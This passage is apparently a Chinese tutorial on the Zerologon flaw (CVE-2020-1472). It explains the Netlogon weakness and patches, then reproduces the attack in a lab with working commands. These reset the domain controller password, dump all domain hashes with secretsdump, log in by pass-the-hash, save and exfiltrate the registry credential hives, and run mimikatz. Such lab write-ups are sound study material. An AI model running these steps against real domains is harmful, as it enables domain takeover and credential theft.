        ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2011.png)
        
    3. 使用协商的 AES-CFB8 算法，以 `session key` 作为密钥，来解密 `ClearNewPassword` 提供的新密码
    4. 完成修改

这样大致过程就说完了，很显然我们又碰上了一个难题，域控会对密码进行解密，由于我们至始至终都不知道 `session key`，所以根本就无法控制域控会把我们发送过去的 `ClearNewPassword` 解密成什么

不过，肯定是用利用办法的，当我们能够进行到这一步，这时以该 `session key` 作为密钥的 AES-CFB8 加解密0的结果还为0，充分利用这一点，如果我们在这里简单地提供516个0，这将被解密为516个0（即零长度密码）。

ps：为什么说是516个字节，因为buffer 占512字节，length 占4字节，两者相加 `ClearNewPassword` 所占大小就为516个字节。

向域控发送全零的 `ClearNewPassword`，其解密后得到新密码为空，因为 length 也为0。然而为计算机设置空密码是不会被域控禁止的，这意味着我们可以为域中的任何计算机设置一个空密码。

结合上面几步完整的流程图：

![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2012.png)

完成后，我们可以代表这台计算机建立一个新的 Netlogon 连接，这次我们知道了计算机的密码（它是空的），所以我们可以正常地遵循协议。如果我们愿意，现在也可以设置任何其他非空密码。

**以这种方式更改计算机密码时，仅在AD中更改。**目标系统本身仍将在本地存储其原始密码。然后，该计算机将无法再对域进行身份验证，只能通过手动操作重新同步。该计算机无法进行身份验证就会导致不能访问内网中的服务，可以说我们通过 Zerologon 能够造成任意设备的拒绝服务漏洞。

除此之外，如果我们修改为空密码的用户在域中有任何特权，我们都可以随意滥用。

## Exploit step 5：从修改密码到域管理员

我们伪造一个域内计算机的身份，向域控发出更改所伪造账户在AD中密码的请求，甚至我们可以伪造成域控本身，与域控进行 Netlogon 连接，在通道建立后更改域控账户的密码

ps：注意这里域控账户和域管账户是两个概念，域控账户是 domain controller 这台机子的本地用户，而域管帐户是对于整个域来说管理员账户

完成修改后，这样做会产生一种有趣的情况，即 AD 中存储的 DC 密码与 DC 本地注册表中（位于`HKLM\SECURITY\Policy\Secrets\$machine.ACC`）存储的密码不同。

这可能会导致域控机脱离域控或者其他事故，比如域控上的 DNS 解析器停止工作。

这里 [Dirk-jan](https://twitter.com/_dirkjan) 在他的推特中对为什么修改完密码之后会脱域做出了解释，[原文](https://twitter.com/_dirkjan/status/1306280553281449985)。

作为攻击者，我们肯定是希望用空密码登录到 DC 上对其进行攻击。但是，只有当 DC 使用 AD 中存储的密码，而不是用本地存储的密码，来验证我们的登录尝试时，我们才够登入 DC。

接下来用到的一个 Impacket 工具包的 secretsdump.py

这个脚本可以成功利用新的空域控密码，通过域复制服务（Domain Replication Service）协议从域中成功提取所有用户 hash，这包括域管理员的 hash（包括 krbtgt 密钥，可用于创建黄金票证），可用于登录到 DC（使用经典的 pass-the-hash 攻击），并更新存储在 DC 本地注册表中的计算机密码。

这样 DC 可以正常工作，并且让攻击者成为域管理员。

## 简单总结

通过发送大量的 Netlogon 消息（其中各个字段都用零填充），攻击者可以与域控建立 Netlogon 连接，并更改 AD 中存储的域控制器的计算机密码，然后可以使用它获取域管理员凭据，再还原原始 DC 密码。

Zerologon 攻击具有很大危害，一方面，是因为基本所有接入本地内网的攻击者都可以尝试进行这种攻击；另一方面，这种攻击完全不未经身份验证，攻击者不需要任何用户凭据就可以发起。

补丁：

- 2020年8月，发布的补丁通过对域中的所有Windows服务器和客户端强制启用 Secure NRPC（即Netlogon签名和密封）来解决 Zerologon 攻击（这导致我们的 exploit step 2 无法使用了）
- 2021年2月，域内默认开启“强制模式”，即强制所有设备使用 Secure NRPC，要求管理员提前更新、停用或白名单不支持 Secure NRPC 的设备。详细信息可查**[How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)。**

# 漏洞复现

Zerologon 攻击测试工具：https://github.com/SecuraBV/CVE-2020-1472

Zerologon 攻击利用工具：https://github.com/dirkjanm/CVE-2020-1472或https://github.com/risksense/zerologon

secretsdump.py 在 impacket/examples/ 下，地址：https://github.com/SecureAuthCorp/impacket

复现环境基于红日3，直接将 DC 和 kali 设置到一个网段

```
kali:192.168.21.129
DC:192.168.21.132
```

域：test.org

复现过程：

1. ****验证漏洞存在****
    
    首先使用ZeroLogon测试脚本来验证下目标机是否存在该漏洞
    
    ```
    python3  zerologon_tester.py  目标计算机名  目标IP
    
    python3 zerologon_tester.py WIN-8GA56TNV3MV 192.168.21.132
    ```
    
    ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2013.png)
    
2. ****置空域控HASH****
    
    **注意：域控的机器帐户 HASH 存储在注册表中，系统启动时会将其加载到 lsass，当攻击置空域控 HASH 后，仅 AD (NTDS.DIT)  中的密码会更改，而不是注册表或加载到 lsass 中的密码，这样将会导致域控脱域，无法使用 Kerberos 进行身份验证，因此要尽快恢复。**
    
    使用 Zerologon 工具将域控密码置换为空
    
    上面给出的工具 set_empty_pw.py 和 cve-2020-1472-exploit.py 都可以用
    
    1. 方法一：
        
        ```
        python3 set_empty_pw.py DC_NETBIOS_NAME DC_IP_ADDR
        
        python3 set_empty_pw.py WIN-8GA56TNV3MV 192.168.21.132
        ```
        
        ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2014.png)
        
    2. 方法二：
        
        ```
        python3 cve-2020-1472-exploit.py DC_IP_ADDR DC_NETBIOS_NAME
        
        python3 cve-2020-1472-exploit.py 192.168.21.132 WIN-8GA56TNV3MV
        ```
        
3. ****获取域管HASH****
    
    使用 impacket 中的 secretsdump.py 脚本
    
    ```
    python3  secretsdump.py  域/目标计算机名/$@目标IP  -just-dc  -no-pass
    
    python3  secretsdump.py  test.org/WIN-8GA56TNV3MV\$@192.168.21.132  -just-dc  -no-pass
    ```
    
    ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2015.png)
    
    如上，存在域控机 AD 里的，域管 Administrator 的hash 为18edd0cc3227be3bf61ce198835a1d97，DC 的 hash 为31d6cfe0d16ae931b73c59d7e0c089c0。
    
    其实，显而易见的是，空密码的 hash 是固定的，固定为*31d6cfe0d16ae931b73c59d7e0c089c0*，可以直接用以下命令
    
    ```
    python3  secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 test.org/WIN-8GA56TNV3MV\$@192.168.21.132
    ```
    
4. **以域管身份连接DC**
    
    使用 impacket 中的 wmiexec.py 脚本进行横向连接
    
    ```
    python3  wmiexec.py  域/administrator@目标IP  -hashes  administrator账号的哈希值
    
    python3  wmiexec.py test.org/administrator@192.168.21.132 -hashes :18edd0cc3227be3bf61ce198835a1d97
    ```
    
    ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2016.png)
    
    此处若一切输入正确，确无法连接，则可能已经发生脱域，可以把域名去掉连接试试
    
    ```
    python3  wmiexec.py administrator@192.168.21.132 -hashes :18edd0cc3227be3bf61ce198835a1d97
    ```
    
5. ****恢复域控HASH****
    
    获取DC注册表信息中域控原始HASH，可以利用 Impacket 包中的 [wmiexec.py](http://wmiexec.py)、psexec.py 工具获取，以 wmiexec.py 为例，命令中进行了 HASH 传递，凭证是刚刚获取的域管 HASH：
    
    ```
    # 获取注册表转储文件，默认存在目标机C:\目录下
    # 目标机中文系统会提示解码错误，不影响使用
    # /y:强制覆盖已存在文件，避免目标机C:\目录下存在同名文件，命令会询问是否覆盖，半交互环境程序会卡住
    C:\>reg save HKLM\SYSTEM system.hive /y    
    C:\>reg save HKLM\SAM sam.hive /y         
    C:\>reg save HKLM\SECURITY security.hive /y
    
    # 将转储文件，下载到本地
    C:\>lget system.hive                    
    C:\>lget sam.hive
    C:\>lget security.hive
    
    # 删除目标机上的转储文件
    C:\>del /f system.hive                 
    C:\>del /f sam.hive
    C:\>del /f security.hive
    ```
    
    ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2017.png)
    
    保存的文件在 wmiexec.py 脚本同一目录下
    
    ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2018.png)
    
    通过注册表转储导出 HASH：
    
    ```
    python3 secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
    ```
    
    ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2019.png)
    
    `$MACHINE.ACC:plain_password_hex` 后的值为下一步恢复密码需要的值
    
    域控密钥 (HEX) 为：
    
    ```
    2fb76130ee9ede18551764b9098c1327baf7e5a1760259dfa9de8f98690fd492c43fd7b7a5b0029e2f06b21fc2a29ecd6568f4af7b35f72a2f1756432f7b1765d6add82999303f449655a6453f6f6b5f4fb02c19bd387f5d1deee7668d3e925d566ee1caf4aa607939da6a201b92d93fabbb6c515901d800a841cc0020ee5757901de22d901cebcd59ba34895e300f0f9ee28e8ef029d68fa92d810fa7ee6155ce9edbe69790a1837f9dd376b05e3d1a9a2de7aa59ad71e028c4e1db9adaf766b06acf4e2c3970be66e37bc97b1ac57ffcbcd57b5f81b04b92f3e3a734af0d502223a5e3f5df769c2c9ad88b78cf29d
    ```
    
    NTLM HASH 为：
    
    ```
    aad3b435b51404eeaad3b435b51404ee:7ece30807d61b68b95c8d91024eef348
    ```
    
    然后用工具恢复，将注册表中 HASH 记录同步到 NTDS.DIT（即AD）：
    
    1. 方法一：利用 NT HASH 恢复：
        
        ```
        python3 reinstall_original_pw.py WIN-8GA56TNV3MV 192.168.21.132 7ece30807d61b68b95c8d91024eef348
        ```
        
        ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2020.png)
        
    2. 方法二：利用密钥 (HEX) 恢复：
        
        ```
        python3 restorepassword.py test.org/WIN-8GA56TNV3MV -target-ip 192.168.21.132 -hexpass 2fb76130ee9ede18551764b9098c1327baf7e5a1760259dfa9de8f98690fd492c43fd7b7a5b0029e2f06b21fc2a29ecd6568f4af7b35f72a2f1756432f7b1765d6add82999303f449655a6453f6f6b5f4fb02c19bd387f5d1deee7668d3e925d566ee1caf4aa607939da6a201b92d93fabbb6c515901d800a841cc0020ee5757901de22d901cebcd59ba34895e300f0f9ee28e8ef029d68fa92d810fa7ee6155ce9edbe69790a1837f9dd376b05e3d1a9a2de7aa59ad71e028c4e1db9adaf766b06acf4e2c3970be66e37bc97b1ac57ffcbcd57b5f81b04b92f3e3a734af0d502223a5e3f5df769c2c9ad88b78cf29d
        ```
        
    3. 方法三：Powershell
        
        首先利用远程执行命令工具 (wmiexec、psexec、smbexec、atexec等) 获取域控 shell，然后利用 powershell 命令重置主机 HASH，注意这种方法并不是恢复原 HASH，而是将 NTDS.DIT 中的凭证以及注册表 /lsass 中的凭证重置 (随机数)：
        
        ```
        python3  wmiexec.py test.org/administrator@192.168.21.132 -hashes :18edd0cc3227be3bf61ce198835a1d97
        
        C:\>powershell -c Reset-ComputerMachinePassword
        ```
        
6. 验证密码恢复
    
    重复第3步，验证下是否恢复成功
    
    ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2021.png)
    

以上还可以直接用 **mimikatz** 一步到位，不过需要新版的，支持 ZeroLogon 漏洞利用：https://github.com/gentilkiwi/mimikatz

流程：

```
ZeroLogon检测：
mimikatz.exe "lsadump::zerologon /target:WIN-8GA56TNV3MV.test.org /account:WIN-8GA56TNV3MV$" exit

ZeroLogon利用：
mimikatz.exe "lsadump::zerologon /target:WIN-8GA56TNV3MV.test.org /account:WIN-8GA56TNV3MV$ /exploit" exit

提取administrator账号hash:
mimikatz.exe "lsadump::dcsync /domain:test.org /dc:WIN-8GA56TNV3MV.test.org /user:administrator /authuser:WIN-8GA56TNV3MV$ /authdomain:test /authpassword:"" /authntlm" exit

还原密码:
mimikatz.exe "lsadump::postzerologon /target:test.org /account:WIN-8GA56TNV3MV$" exit
```

参考文章：

[Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)

[域渗透系列--那些一键打域控的漏洞之ZeroLogon](https://www.jianshu.com/p/7bd3f242c09c)

[CVE-2020-1472: NetLogon特权提升漏洞分析](https://cert.360.cn/report/detail?id=2e904ef9ac96834a3dd7fc058cea4fe5)

[ZeroLogon (CVE-2020-1472) 漏洞利用](https://blog.csdn.net/Captain_RB/article/details/120643838)

[CVE-2020-1472域内提权漏洞复现](https://www.exterminate-dog.com/2022/01/17/2022002/)